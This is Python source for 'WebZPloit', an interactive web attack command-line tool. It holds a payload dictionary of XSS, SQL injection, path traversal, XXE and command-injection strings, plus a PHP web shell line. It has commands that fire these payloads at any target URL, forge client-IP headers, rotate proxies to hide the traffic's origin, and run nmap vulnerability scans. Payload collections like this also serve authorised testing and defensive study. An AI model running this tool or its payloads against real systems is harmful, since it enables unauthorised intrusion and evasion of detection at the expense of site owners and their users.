import cmd
import requests
from bs4 import BeautifulSoup
import subprocess
import re
import random
import time
from urllib.parse import urljoin, urlparse
import sys
import os
import socket
import json
import threading
from concurrent.futures import ThreadPoolExecutor

try:
    import dns.resolver
except ImportError:
    dns = None

class WebZPloit(cmd.Cmd):
    prompt = "> "
    doc_leader = ""
    identchars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"

    def __init__(self):
        super().__init__()
        self.target_url = None
        self.target_ip = None
        self.discovered_paths = set()
        self.content_cache = {}
        self.session = requests.Session()
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0'
        ]
        self.headers = {}
        self.proxies = {}
        self.proxy_list = []
        self.proxy_enabled = False
        self.proxy_file = None
        self.cookies = {}
        self.delay = 0
        self.clear_screen = False
        self.payloads = {
            'xss_reflected': '<script>alert(1)</script>',
            'xss_stored': '<script>alert(document.cookie)</script>',
            'xss_dom': '"><script>alert(1)</script>',
            'xss_img': '<img src=x onerror=alert(1)>',
            'xss_svg': '<svg onload=alert(1)>',
            'xss_iframe': '<iframe src="javascript:alert(1)">',
            'xss_body': '<body onload=alert(1)>',
            'xss_input': '<input type="text" onfocus=alert(1) autofocus>',
            'xss_audio': '<audio src=x onerror=alert(1)>',
            'xss_video': '<video src=x onerror=alert(1)>',
            'xss_script_encoded': '&#60;script&#62;alert(1)&#60;/script&#62;',
            'xss_hex': '%3Cscript%3Ealert(1)%3C/script%3E',
            'xss_double': '"><script>alert(1)</script>',
            'xss_uppercase': '<SCRIPT>alert(1)</SCRIPT>',
            'xss_obfuscated': '<scr<script>ipt>alert(1)</scr</script>ipt>',
            'xss_onerror': '<img src="x" onerror="alert(1)">',
            'xss_onload': '<body onload="alert(1)">',
            'xss_onmouseover': '<div onmouseover="alert(1)">hover</div>',
            'xss_onclick': '<div onclick="alert(1)">click</div>',
            'xss_onfocus': '<input onfocus="alert(1)">',
            'xss_onchange': '<input onchange="alert(1)">',
            'xss_onsubmit': '<form onsubmit="alert(1)">',
            'xss_onerror_encoded': '%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E',
            'xss_svg_encoded': '%3Csvg%20onload%3Dalert(1)%3E',
            'sql_inject': "' OR '1'='1",
            'sql_union': "' UNION SELECT NULL--",
            'sql_sleep': "' OR SLEEP(5)--",
            'sql_boolean': "' OR 1=1--",
            'sql_comment': "' OR '1'='1' /*",
            'path_traversal': '../../../../etc/passwd',
            'cmd_inject': '; ls -la',
            'cmd_inject_linux': '| whoami',
            'cmd_inject_windows': '& dir',
            'lfi': 'php://filter/convert.base64-encode/resource=',
            'lfi_etc': 'etc/passwd',
            'rce': '<?php system($_GET["cmd"]); ?>',
            'ssrf': 'http://localhost/admin',
            'xxe': '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>',
            'open_redirect': '//google.com',
            'host_header': 'Host: evil.com'
        }
        self.payload_results = {}
        self.nmap_scan = {}
        self.scan_history = []
        self.thread_pool = ThreadPoolExecutor(max_workers=10)
        self.running_tasks = []

    def preloop(self):
        if self.clear_screen:
            os.system('clear' if os.name == 'posix' else 'cls')
        self.check_dependencies()

    def check_dependencies(self):
        missing = []
        try:
            import requests
        except ImportError:
            missing.append('requests')
        try:
            from bs4 import BeautifulSoup
        except ImportError:
            missing.append('beautifulsoup4')
        try:
            import dns
        except ImportError:
            missing.append('dnspython')
        if missing:
            print(f"Missing dependencies: {', '.join(missing)}")
            print("Install with: pip install " + ' '.join(missing))
            if sys.platform == 'linux':
                print("Or on Void Linux: sudo xbps-install python3-requests python3-beautifulsoup4 python3-dnspython")

    def postcmd(self, stop, line):
        if self.clear_screen and not stop:
            os.system('clear' if os.name == 'posix' else 'cls')
        return stop

    def default(self, line):
        if line.startswith('exec '):
            self.do_exec(line[5:])
        elif line.startswith('xss '):
            self.do_xss(line[4:])
        elif line.startswith('payload '):
            self.do_payload(line[8:])
        elif line.startswith('nmap '):
            self.do_nmap(line[5:])
        else:
            print(f"Unknown command: {line}")

    def _get_proxy(self):
        if self.proxy_enabled and self.proxy_list:
            proxy = random.choice(self.proxy_list)
            return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        return self.proxies

    def _get_session(self):
        sess = requests.Session()
        sess.headers.update(self.headers)
        sess.cookies.update(self.cookies)
        proxy = self._get_proxy()
        if proxy:
            sess.proxies.update(proxy)
        return sess

    def do_url(self, arg):
        if not arg:
            print("Usage: url <target_url>")
            return
        self.target_url = arg
        self.discovered_paths = set()
        self.content_cache = {}
        try:
            parsed = urlparse(arg)
            if parsed.hostname:
                self.target_ip = socket.gethostbyname(parsed.hostname)
                print(f"Target set to: {self.target_url}")
                print(f"Target IP: {self.target_ip}")
            else:
                self.target_ip = None
                print(f"Target set to: {self.target_url}")
        except:
            self.target_ip = None
            print(f"Target set to: {self.target_url}")
            print("Could not resolve IP")

    def do_viewip(self, arg):
        if not self.target_url:
            print("Error: Set target URL first")
            return
        if self.target_ip:
            print(f"IP Address: {self.target_ip}")
            try:
                hostname = socket.gethostbyaddr(self.target_ip)[0]
                print(f"Hostname: {hostname}")
            except:
                print("Could not resolve hostname")
            try:
                response = self._get_session().get(self.target_url, timeout=5)
                print(f"Server: {response.headers.get('Server', 'Unknown')}")
                print(f"Powered By: {response.headers.get('X-Powered-By', 'Unknown')}")
            except:
                pass
        else:
            print("IP not resolved")

    def do_dns(self, arg):
        if not arg:
            print("Usage: dns <domain>")
            print("  dns google.com")
            return
        if dns is None:
            print("DNS module not available. Install dnspython:")
            print("  pip install dnspython")
            print("  or on Void Linux: sudo xbps-install python3-dnspython")
            return
        try:
            answers = dns.resolver.resolve(arg, 'A')
            print(f"DNS records for {arg}:")
            for rdata in answers:
                print(f"  A: {rdata.address}")
            try:
                mx = dns.resolver.resolve(arg, 'MX')
                for rdata in mx:
                    print(f"  MX: {rdata.exchange} (priority {rdata.preference})")
            except:
                pass
            try:
                ns = dns.resolver.resolve(arg, 'NS')
                for rdata in ns:
                    print(f"  NS: {rdata}")
            except:
                pass
            try:
                txt = dns.resolver.resolve(arg, 'TXT')
                for rdata in txt:
                    print(f"  TXT: {rdata}")
            except:
                pass
        except Exception as e:
            print(f"DNS error: {e}")

    def do_paths(self, arg):
        if not self.target_url:
            print("Error: Set target URL first")
            return
        try:
            response = self._get_session().get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            for link in soup.find_all(['a', 'link', 'script'], href=True):
                path = link.get('href')
                if path:
                    full_path = urljoin(self.target_url, path)
                    if full_path.startswith(self.target_url):
                        self.discovered_paths.add(full_path)
            for script in soup.find_all('script', src=True):
                path = script['src']
                full_path = urljoin(self.target_url, path)
                if full_path.startswith(self.target_url):
                    self.discovered_paths.add(full_path)
            for img in soup.find_all('img', src=True):
                path = img['src']
                full_path = urljoin(self.target_url, path)
                if full_path.startswith(self.target_url):
                    self.discovered_paths.add(full_path)
            for form in soup.find_all('form', action=True):
                path = form['action']
                full_path = urljoin(self.target_url, path)
                if full_path.startswith(self.target_url):
                    self.discovered_paths.add(full_path)
            print(f"Discovered {len(self.discovered_paths)} paths.")
        except Exception as e:
            print(f"Error crawling: {e}")

    def do_frep(self, arg):
        if not arg:
            print("Usage: frep <keyword>")
            return
        matches = [path for path in self.discovered_paths if arg.lower() in path.lower()]
        if matches:
            for match in matches:
                print(match)
        else:
            print("No matches found.")

    def do_fcep(self, arg):
        if not arg:
            print("Usage: fcep <keyword>")
            return
        if not self.discovered_paths:
            print("No paths discovered. Run 'paths' first.")
            return
        for path in self.discovered_paths:
            try:
                if path not in self.content_cache:
                    time.sleep(self.delay)
                    response = self._get_session().get(path, timeout=10)
                    self.content_cache[path] = response.text
                if arg.lower() in self.content_cache[path].lower():
                    print(f"Match found in {path}")
            except:
                continue

    def do_spoof(self, arg):
        if not arg:
            print("Usage: spoof <agent|referer|ip|all|clear>")
            return
        if arg == 'clear':
            self.headers.pop('User-Agent', None)
            self.headers.pop('Referer', None)
            self.headers.pop('X-Forwarded-For', None)
            self.headers.pop('X-Real-IP', None)
            print("Cleared spoofing headers")
            return
        if arg == 'agent' or arg == 'all':
            self.headers['User-Agent'] = random.choice(self.user_agents)
            print(f"Spoofed User-Agent: {self.headers['User-Agent']}")
        if arg == 'referer' or arg == 'all':
            self.headers['Referer'] = self.target_url or 'https://google.com'
            print(f"Spoofed Referer: {self.headers['Referer']}")
        if arg == 'ip' or arg == 'all':
            fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            self.headers['X-Forwarded-For'] = fake_ip
            self.headers['X-Real-IP'] = fake_ip
            print(f"Spoofed IP: {fake_ip}")

    def do_proxyfile(self, arg):
        if not arg:
            print("Usage: proxyfile <filename.txt>")
            print("Format: ip:port per line")
            return
        try:
            with open(arg, 'r') as f:
                self.proxy_list = [line.strip() for line in f if line.strip()]
            print(f"Loaded {len(self.proxy_list)} proxies from {arg}")
            self.proxy_file = arg
        except Exception as e:
            print(f"Error loading proxy file: {e}")

    def do_toggleproxy(self, arg):
        if not self.proxy_list:
            print("No proxies loaded. Use 'proxyfile <filename>' first")
            return
        self.proxy_enabled = not self.proxy_enabled
        if self.proxy_enabled:
            print(f"Proxy enabled. Using {len(self.proxy_list)} proxies")
        else:
            print("Proxy disabled. Using direct connection")

    def do_headers(self, arg):
        if not arg:
            print("Usage: headers <add|set|clear|show> <key> <value>")
            return
        parts = arg.split()
        if parts[0] == 'show':
            if self.headers:
                for key, value in self.headers.items():
                    print(f"{key}: {value}")
            else:
                print("No custom headers set")
        elif parts[0] == 'add' and len(parts) >= 3:
            key = parts[1]
            value = ' '.join(parts[2:])
            self.headers[key] = value
            print(f"Added header: {key}: {value}")
        elif parts[0] == 'set' and len(parts) >= 3:
            key = parts[1]
            value = ' '.join(parts[2:])
            self.headers[key] = value
            print(f"Set header: {key}: {value}")
        elif parts[0] == 'clear':
            self.headers.clear()
            print("Cleared all custom headers")
        else:
            print("Invalid headers command")

    def do_cookies(self, arg):
        if not arg:
            print("Usage: cookies <add|clear|load|show> <key=value>")
            return
        parts = arg.split()
        if parts[0] == 'show':
            if self.cookies:
                for key, value in self.cookies.items():
                    print(f"{key}={value}")
            else:
                print("No cookies set")
        elif parts[0] == 'add' and len(parts) >= 2:
            for cookie in parts[1:]:
                if '=' in cookie:
                    key, value = cookie.split('=', 1)
                    self.cookies[key] = value
                    print(f"Added cookie: {key}={value}")
        elif parts[0] == 'clear':
            self.cookies.clear()
            print("Cleared all cookies")
        elif parts[0] == 'load':
            cookie_string = ' '.join(parts[1:])
            for cookie in cookie_string.split(';'):
                cookie = cookie.strip()
                if '=' in cookie:
                    key, value = cookie.split('=', 1)
                    self.cookies[key] = value
            print(f"Loaded {len(self.cookies)} cookies")

    def do_proxy(self, arg):
        if not arg:
            print("Usage: proxy <http://ip:port> or proxy clear")
            return
        if arg == 'clear':
            self.proxies.clear()
            print("Cleared proxy settings")
        else:
            self.proxies = {'http': arg, 'https': arg}
            print(f"Proxy set to: {arg}")

    def do_delay(self, arg):
        if not arg:
            print("Usage: delay <seconds>")
            return
        try:
            self.delay = float(arg)
            print(f"Delay set to {self.delay} seconds")
        except:
            print("Invalid delay value")

    def do_clear(self, arg):
        self.clear_screen = not self.clear_screen
        print(f"Clear screen after each command: {self.clear_screen}")

    def do_request(self, arg):
        if not self.target_url:
            print("Error: Set target URL first")
            return
        parts = arg.split()
        if not parts:
            print("Usage: request <get|post|put|delete|patch|options|head> <path> [data]")
            return
        method = parts[0].lower()
        path = parts[1] if len(parts) > 1 else '/'
        url = urljoin(self.target_url, path)
        data = None
        if len(parts) > 2:
            data = ' '.join(parts[2:])
        try:
            time.sleep(self.delay)
            sess = self._get_session()
            if method == 'get':
                response = sess.get(url, timeout=10)
            elif method == 'post':
                response = sess.post(url, data=data, timeout=10)
            elif method == 'put':
                response = sess.put(url, data=data, timeout=10)
            elif method == 'delete':
                response = sess.delete(url, timeout=10)
            elif method == 'patch':
                response = sess.patch(url, data=data, timeout=10)
            elif method == 'options':
                response = sess.options(url, timeout=10)
            elif method == 'head':
                response = sess.head(url, timeout=10)
            else:
                print("Invalid method")
                return
            print(f"Status: {response.status_code}")
            print(f"Headers: {dict(response.headers)}")
            print(f"Length: {len(response.text)} bytes")
            if len(response.text) < 2000:
                print(response.text)
            else:
                print(response.text[:1000] + "\n... [truncated]")
            self.scan_history.append(f"{method} {path} - {response.status_code}")
        except Exception as e:
            print(f"Request error: {e}")

    def do_xss(self, arg):
        if not self.target_url:
            print("Error: Set target URL first")
            return
        if not arg:
            print("Usage: xss <path> [payload_type]")
            print("Payload types: reflected, stored, dom, img, svg, iframe, body, input, audio, video, script_encoded, hex, double, uppercase, obfuscated, onerror, onload, onmouseover, onclick, onfocus, onchange, onsubmit, onerror_encoded, svg_encoded, all")
            return
        parts = arg.split()
        path = parts[0]
        url = urljoin(self.target_url, path)
        payload_type = parts[1] if len(parts) > 1 else 'all'

        if payload_type == 'all':
            for name, payload in self.payloads.items():
                if 'xss' in name:
                    self._test_xss(url, payload, name)
        elif payload_type in self.payloads:
            self._test_xss(url, self.payloads[payload_type], payload_type)
        else:
            print("Invalid payload type")

    def _test_xss(self, url, payload, payload_name):
        try:
            encoded_payload = requests.utils.quote(payload)
            test_url = f"{url}?q={encoded_payload}"
            sess = self._get_session()
            response = sess.get(test_url, timeout=10)
            if payload in response.text or payload.lower() in response.text.lower():
                print(f"[+] XSS {payload_name} payload reflected in {url}")
                self.payload_results[url] = payload
            else:
                print(f"[-] XSS {payload_name} not reflected in {url}")
        except Exception as e:
            print(f"Error testing XSS: {e}")

    def do_payload(self, arg):
        if not arg:
            print("Usage: payload <list|show|add|exec> <name> [payload]")
            print("  payload list                - List all payloads")
            print("  payload show <name>         - Show payload content")
            print("  payload add <name> <payload> - Add custom payload")
            print("  payload exec <name> <path>  - Execute payload on path")
            return
        parts = arg.split()
        if parts[0] == 'list':
            for name in sorted(self.payloads.keys()):
                print(f"  {name}")
        elif parts[0] == 'show' and len(parts) > 1:
            if parts[1] in self.payloads:
                print(self.payloads[parts[1]])
            else:
                print("Payload not found")
        elif parts[0] == 'add' and len(parts) > 2:
            name = parts[1]
            payload = ' '.join(parts[2:])
            self.payloads[name] = payload
            print(f"Added payload: {name}")
        elif parts[0] == 'exec' and len(parts) > 2:
            name = parts[1]
            path = parts[2]
            if name in self.payloads and self.target_url:
                url = urljoin(self.target_url, path)
                self._test_xss(url, self.payloads[name], name)
            else:
                print("Invalid payload or target not set")

    def do_exec(self, arg):
        if not self.target_url:
            print("Error: Set target URL first")
            return
        if not arg:
            print("Usage: exec <\"javascript_code\"> <path>")
            print("  exec \"<script>alert(1)</script>\" /test")
            return
        parts = arg.split()
        if len(parts) < 2:
            print("Need payload and path")
            return
        payload = parts[0]
        path = parts[1]
        url = urljoin(self.target_url, path)
        self._test_xss(url, payload, "custom")

    def do_curl(self, arg):
        if not arg:
            print("Usage: curl <args>")
            return
        try:
            cmd = ['curl', '-s']
            if self.target_url and not arg.startswith('-'):
                cmd.append(self.target_url + arg)
            else:
                cmd.extend(arg.split())
            for key, value in self.headers.items():
                cmd.extend(['-H', f'{key}: {value}'])
            if self.proxy_enabled and self.proxy_list:
                proxy = random.choice(self.proxy_list)
                cmd.extend(['-x', f'http://{proxy}'])
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            print(result.stdout)
            if result.stderr:
                print(result.stderr)
        except subprocess.TimeoutExpired:
            print("Curl command timed out")
        except Exception as e:
            print(f"Error executing curl: {e}")

    def do_nmap(self, arg):
        if not arg:
            print("Usage: nmap <target|scan|port|os|vuln|help>")
            print("  nmap scan <ip>              - Basic scan")
            print("  nmap port <ip> <port>       - Scan specific port")
            print("  nmap os <ip>                - OS detection")
            print("  nmap vuln <ip>              - Vulnerability scan")
            print("  nmap quick <ip>             - Quick port scan")
            print("  nmap full <ip>              - Full port scan")
            print("  nmap script <ip> <script>   - Run nmap script")
            return
        parts = arg.split()
        if parts[0] == 'help':
            print("Nmap commands:")
            print("  nmap scan <ip>              - Basic scan (top 1000 ports)")
            print("  nmap port <ip> <port>       - Scan specific port")
            print("  nmap os <ip>                - OS detection")
            print("  nmap vuln <ip>              - Vulnerability scan")
            print("  nmap quick <ip>             - Quick scan (top 20 ports)")
            print("  nmap full <ip>              - Full port scan (1-65535)")
            print("  nmap script <ip> <script>   - Run nmap script")
            return
        if len(parts) < 2:
            print("Insufficient arguments")
            return
        target = parts[1]
        try:
            if sys.platform == 'win32':
                cmd = ['nmap.exe']
            else:
                cmd = ['nmap']

            if parts[0] == 'scan':
                cmd.extend(['-T4', '-F', target])
            elif parts[0] == 'port' and len(parts) > 2:
                port = parts[2]
                cmd.extend(['-p', port, target])
            elif parts[0] == 'os':
                cmd.extend(['-O', '-F', target])
            elif parts[0] == 'vuln':
                cmd.extend(['--script', 'vuln', target])
            elif parts[0] == 'quick':
                cmd.extend(['-T4', '--top-ports', '20', target])
            elif parts[0] == 'full':
                cmd.extend(['-p-', target])
            elif parts[0] == 'script' and len(parts) > 2:
                script = parts[2]
                cmd.extend(['--script', script, target])
            else:
                print("Invalid nmap command")
                return
            print(f"Running: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            print(result.stdout)
            if result.stderr:
                print(result.stderr)
            self.nmap_scan[target] = result.stdout
        except subprocess.TimeoutExpired:
            print("Nmap scan timed out")
        except FileNotFoundError:
            print("Nmap not found. Install nmap:")
            if sys.platform == 'win32':
                print("  Download from https://nmap.org/download.html")
            elif sys.platform == 'linux':
                print("  sudo apt-get install nmap  # Debian/Ubuntu")
                print("  sudo xbps-install nmap     # Void Linux")
                print("  sudo yum install nmap      # RHEL/CentOS")
        except Exception as e:
            print(f"Error running nmap: {e}")

    def do_spoof_all(self, arg):
        self.do_spoof('all')
        self.headers['Accept'] = '*/*'
        self.headers['Accept-Language'] = 'en-US,en;q=0.9'
        self.headers['Accept-Encoding'] = 'gzip, deflate, br'
        self.headers['Connection'] = 'keep-alive'
        self.headers['Upgrade-Insecure-Requests'] = '1'
        print("Applied complete spoofing profile")

    def do_vectors(self, arg):
        print("=== SPOOFING VECTORS ===")
        print("X-Forwarded-For: 127.0.0.1")
        print("X-Real-IP: 127.0.0.1")
        print("X-Originating-IP: 127.0.0.1")
        print("X-Remote-IP: 127.0.0.1")
        print("X-Remote-Addr: 127.0.0.1")
        print("X-Client-IP: 127.0.0.1")
        print("Client-IP: 127.0.0.1")
        print("")
        print("=== MANIPULATION VECTORS ===")
        print("Referer: https://attacker.com")
        print("Origin: https://attacker.com")
        print("Host: localhost")
        print("X-Host: localhost")
        print("X-Forwarded-Host: localhost")
        print("")
        print("=== SPOOFING HEADERS ===")
        for ip_header in ['X-Forwarded-For', 'X-Real-IP', 'X-Originating-IP', 'X-Remote-IP', 'X-Remote-Addr', 'X-Client-IP', 'Client-IP']:
            self.headers[ip_header] = '127.0.0.1'
            print(f"Set {ip_header}: 127.0.0.1")
        print("Applied all spoofing vectors")

    def do_show(self, arg):
        if not arg:
            print("Usage: show <paths|cache|proxies|history|results>")
            return
        if arg == 'paths':
            if self.discovered_paths:
                for path in sorted(self.discovered_paths):
                    print(path)
            else:
                print("No paths discovered")
        elif arg == 'cache':
            if self.content_cache:
                for path in self.content_cache.keys():
                    print(f"{path} - {len(self.content_cache[path])} bytes")
            else:
                print("No cached content")
        elif arg == 'proxies':
            if self.proxy_list:
                for proxy in self.proxy_list:
                    print(proxy)
                print(f"Total: {len(self.proxy_list)} proxies")
                print(f"Proxy enabled: {self.proxy_enabled}")
            else:
                print("No proxies loaded")
        elif arg == 'history':
            if self.scan_history:
                for entry in self.scan_history:
                    print(entry)
            else:
                print("No scan history")
        elif arg == 'results':
            if self.payload_results:
                for url, payload in self.payload_results.items():
                    print(f"{url}: {payload}")
            else:
                print("No results")
        else:
            print("Invalid show option")

    def do_save(self, arg):
        if not arg:
            print("Usage: save <filename>")
            return
        try:
            with open(arg, 'w') as f:
                f.write("=== WebZPloit Session ===\n")
                f.write(f"Target: {self.target_url}\n")
                f.write(f"IP: {self.target_ip}\n")
                f.write("\n=== Discovered Paths ===\n")
                for path in sorted(self.discovered_paths):
                    f.write(f"{path}\n")
                f.write("\n=== Payload Results ===\n")
                for url, payload in self.payload_results.items():
                    f.write(f"{url}: {payload}\n")
                f.write("\n=== Scan History ===\n")
                for entry in self.scan_history:
                    f.write(f"{entry}\n")
            print(f"Saved to {arg}")
        except Exception as e:
            print(f"Error saving: {e}")

    def do_ch(self, arg):
        print("=== WEBZPLOIT COMMANDS ===")
        print("")
        print("TARGET MANAGEMENT:")
        print("  url <target>           - Set target URL")
        print("  viewip                 - View target IP info")
        print("  dns <domain>           - DNS lookup")
        print("  paths                  - Crawl and discover paths")
        print("  frep <keyword>         - Search path names")
        print("  fcep <keyword>         - Search page content")
        print("")
        print("REQUEST MANIPULATION:")
        print("  request <method> <path> [data]")
        print("                         - Send HTTP requests")
        print("  curl <args>            - Execute curl with headers")
        print("  exec \"<payload>\" <path> - Execute custom payload")
        print("")
        print("XSS AND PAYLOADS:")
        print("  xss <path> [type]      - Test XSS payloads")
        print("  payload <list|show|add|exec>")
        print("                         - Manage payloads")
        print("")
        print("SPOOFING:")
        print("  spoof <agent|referer|ip|all|clear>")
        print("                         - Spoof request headers")
        print("  spoof_all              - Apply full spoofing profile")
        print("  vectors                - Show all spoofing vectors")
        print("  headers <add|set|clear|show>")
        print("                         - Manage custom headers")
        print("  cookies <add|clear|load|show>")
        print("                         - Manage cookies")
        print("  proxy <url|clear>      - Set proxy")
        print("  proxyfile <filename>   - Load proxy list from file")
        print("  toggleproxy            - Toggle proxy usage")
        print("  delay <seconds>        - Set request delay")
        print("")
        print("NETWORK TOOLS:")
        print("  nmap <command>         - Nmap integration")
        print("  viewip                 - View IP information")
        print("  dns <domain>           - DNS lookup")
        print("")
        print("UTILITY:")
        print("  clear                  - Toggle screen clearing")
        print("  show <paths|cache|proxies|history|results>")
        print("                         - Show saved data")
        print("  save <filename>        - Save session data")
        print("  ch                     - This help menu")
        print("  exit                   - Exit tool")
        print("")
        print("EXAMPLES:")
        print("  url http://example.com")
        print("  viewip")
        print("  proxyfile proxies.txt")
        print("  toggleproxy")
        print("  paths")
        print("  spoof_all")
        print("  request get /admin")
        print("  xss /search all")
        print("  exec \"<script>alert(1)</script>\" /test")
        print("  nmap scan 192.168.1.1")
        print("  nmap vuln 192.168.1.1")
        print("  show paths")
        print("  save session.txt")

    def do_help(self, arg):
        self.do_ch(arg)

    def do_exit(self, arg):
        self.thread_pool.shutdown(wait=False)
        return True

if __name__ == '__main__':
    try:
        WebZPloit().cmdloop()
    except KeyboardInterrupt:
        print("\nExiting...")
